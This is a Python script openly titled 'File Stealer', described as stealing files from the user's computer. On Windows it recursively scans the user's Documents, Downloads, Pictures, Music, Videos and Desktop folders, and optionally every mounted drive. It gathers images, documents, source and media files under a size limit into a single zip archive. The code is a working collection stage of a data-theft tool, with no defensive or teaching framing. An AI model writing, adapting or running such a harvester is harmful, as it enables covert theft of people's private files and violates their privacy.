import time
import os
import sys
import zipfile
import argparse

if not sys.platform.startswith('win'):
    print('This program only works on Windows')
    exit()

args = argparse.ArgumentParser(
    prog='File Stealer',
    description='Steals files from your computer',
    epilog='By programORdie'
)
args.add_argument('-d', '--drives', action='store_true', help='Scans all mounted drives (default: False)', default=False)
args.add_argument('-s', '--max-size', action='store', help='File size limit in MB (default: 5 MB)', default=5)

args = args.parse_args()

SCANDRIVES = args.drives
SMALL_SCAN = False

HOME = os.path.expanduser('~')+"\\"

DIRS = ['Documents', "Downloads", "Pictures", "Music", "Videos", "Desktop"]

DIRS = [HOME + dir for dir in DIRS]

POSSIBLE_DRIVES = ["A:/", "B:/", "D:/", "E:/", "F:/", "G:/", "H:/", "I:/", "J:/", "K:/", "L:/", "M:/", "N:/", "O:/", "P:/", "Q:/", "R:/", "S:/", "T:/", "U:/", "V:/", "W:/", "X:/", "Y:/", "Z:/"]

DRIVES = [drive for drive in POSSIBLE_DRIVES if os.path.exists(drive)]

if SCANDRIVES:
    DIRS.extend(DRIVES)

if SMALL_SCAN:
    DIRS = [HOME + "Pictures"]

ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'py', 'txt', 'mp3', 'mp4', 'pdf', "json", "docx", 'js', 'html', "css", 'ts']
MAX_FILE_SIZE = float(args.max_size) * 1024 * 1024

BLACKLISTED_DIRS = ['.wrangler', '.git', 'node_modules', '.vscode', '.rustup', "Unity"]

allFiles = []
fileSizes = 0
allStartTime = time.time()

def check_file(path):
    if os.path.splitext(path)[-1].replace('.', '') in ALLOWED_EXTENSIONS and os.path.getsize(path) <= MAX_FILE_SIZE and not any(dir in path for dir in BLACKLISTED_DIRS):
        return True
    else:
        return False

def add_file(path):
    global fileSizes
    allFiles.append(path)
    fileSizes += os.path.getsize(path)

print('Analyzing...')

scanStartTime = time.time()

for location in DIRS:
    paths = os.walk(location)
    print(f"Scanning {location}")

    for root, dir, files in paths:
        for file in files:
            if check_file(os.path.join(root, file)):
                add_file(os.path.join(root, file))

print('Scanned in ' + str(int((time.time() - scanStartTime)*1000)/1000) + ' seconds')

print('Zipping files...')

zipTimeStart = time.time()

with zipfile.ZipFile('files.zip', 'w', compression=zipfile.ZIP_DEFLATED) as zip:
    for item in allFiles:
        try:
            zip.write(item)
        except:
            print(item)

print('Zipped in ' + str(int((time.time() - zipTimeStart)*1000)/1000) + ' seconds')

print('Done in ' + str(int((time.time() - allStartTime)*1000)/1000) + ' seconds')

print('-'*20)
print(f'Total files saved: {len(allFiles)}')
print(f'Total size: {int(fileSizes/1024/1024*10)/10} MB')